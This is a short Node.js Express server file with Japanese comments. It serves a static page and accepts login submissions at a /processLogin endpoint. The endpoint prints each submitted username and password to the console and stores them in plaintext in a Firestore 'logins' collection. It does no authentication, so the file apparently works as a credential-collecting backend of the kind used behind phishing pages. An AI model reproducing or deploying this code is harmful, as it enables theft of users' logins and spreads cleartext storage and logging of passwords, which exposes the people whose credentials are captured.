// app.js
const express = require('express');
const path = require('path');
const admin = require('firebase-admin');

// 環境変数からFirebase秘密鍵のJSON文字列を取得してオブジェクトに変換
if (!process.env.FIREBASE_SERVICE_ACCOUNT) {
  console.error("FIREBASE_SERVICE_ACCOUNT environment variable is not set.");
  process.exit(1);
}
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);

// Firebase Admin SDKの初期化
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

// Firestoreインスタンスの生成
const db = admin.firestore();

const app = express();

// ミドルウェア：POSTデータのパース
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 静的ファイルの配信（publicフォルダ内）
app.use(express.static('public'));

// フォーム送信のエンドポイント
app.post('/processLogin', async (req, res) => {
  const { username, password } = req.body;
  console.log("Received data:", username, password);
  if (!username || !password) {
    console.error("入力不足: username or password is missing");
    return res.status(400).json({ status: 'Error', message: '入力が不足しています' });
  }
  
  try {
    // Firestoreの "logins" コレクションにデータを追加する
    const docRef = await db.collection('logins').add({
      username: username,
      password: password,
      date: admin.firestore.FieldValue.serverTimestamp()
    });
    console.log("Document written with ID:", docRef.id);
    res.json({ status: 'Success', id: docRef.id });
  } catch (err) {
    console.error('Error writing to Firestore:', err);
    res.status(500).json({ status: 'Error', message: 'データ保存に失敗しました' });
  }
});

// サーバーの起動
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});